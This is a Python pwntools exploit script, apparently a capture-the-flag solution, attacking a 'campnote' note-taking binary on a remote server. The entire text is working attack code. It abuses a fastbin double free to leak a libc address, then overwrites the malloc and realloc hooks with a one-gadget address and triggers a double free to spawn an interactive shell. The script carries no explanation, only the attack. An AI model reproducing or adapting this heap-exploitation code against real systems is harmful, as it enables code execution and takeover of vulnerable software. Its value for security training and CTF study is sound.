from pwn import *

#p = process('./campnote')
p = remote("pwnable.shop", 20202)
e = ELF('./campnote')
l = e.libc

context.log_level="debug"

def malloc(size, content):
        p.sendlineafter('>>','1')
        p.sendlineafter('size >> ',str(size))
        p.sendlineafter('data >> ',str(content))

def free(index):
        p.sendlineafter('>>','2')
        p.sendlineafter('index >> ', str(index))

def show(index):
        p.sendlineafter('>>','3')
        p.sendlineafter('index >> ', str(index))


size = 0x7f - 24
malloc(size,1)
malloc(size,'a' *8 + p64(e.got['puts']))
malloc(1024,1)
malloc(1024,1)

free(2)
free(0)
free(1)
free(0)

show(2)
p.recvuntil('data >> ')
libc = u64(p.recv(6).ljust(8,'\x00')) - 88 - 16 - l.sym['__malloc_hook']
log.info('libc : '+ hex(libc))

victim = libc + l.sym['__realloc_hook'] - 11 - 16

log.info('victim_chunk_ptr : ' + hex(victim))

malloc(size, p64(victim))
malloc(size,1)
malloc(size,1)

malloc(size, 'a' * 0x13 + p64(libc +0xf02a4))
free(1)
free(1)

p.interactive()
